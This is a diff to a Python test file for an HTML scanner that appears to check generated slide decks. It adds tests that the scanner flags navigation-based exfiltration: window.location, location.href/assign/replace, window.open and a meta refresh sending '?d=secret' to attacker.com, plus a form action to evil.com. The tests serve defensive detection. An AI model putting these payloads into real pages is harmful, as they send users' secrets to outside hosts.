@@ -51,3 +51,40 @@ def test_allows_cdn_script_src():
 
 def test_detects_form_action():
     assert scan_html_for_unsafe_patterns('<form action="https://evil.com"></form>')
+
+
+# --- navigation / redirect exfil vectors (not blockable by CSP connect/img) ---
+
+def test_detects_window_location_assignment():
+    findings = " ".join(
+        scan_html_for_unsafe_patterns('<script>window.location = "https://x/?d=" + secret;</script>')
+    )
+    assert "navigation" in findings
+
+
+def test_detects_location_href_assign_replace():
+    for js in (
+        '<script>location.href = "https://x/?d=1";</script>',
+        '<script>location.assign("https://x");</script>',
+        '<script>document.location.replace("https://x");</script>',
+    ):
+        assert scan_html_for_unsafe_patterns(js), js
+
+
+def test_detects_window_open():
+    assert scan_html_for_unsafe_patterns('<script>window.open("https://x/?d=1");</script>')
+
+
+def test_detects_meta_refresh():
+    assert scan_html_for_unsafe_patterns(
+        '<meta http-equiv="refresh" content="0;url=https://attacker.com/?d=secret">'
+    )
+
+
+def test_clean_deck_with_chart_navigation_words_in_text_not_flagged():
+    # "location" appearing as slide prose / chart labels must not trip the scanner.
+    html = (
+        '<div class="slide"><h1>Sales by location</h1>'
+        '<p>Open the report to navigate the data.</p></div>'
+    )
+    assert scan_html_for_unsafe_patterns(html) == []
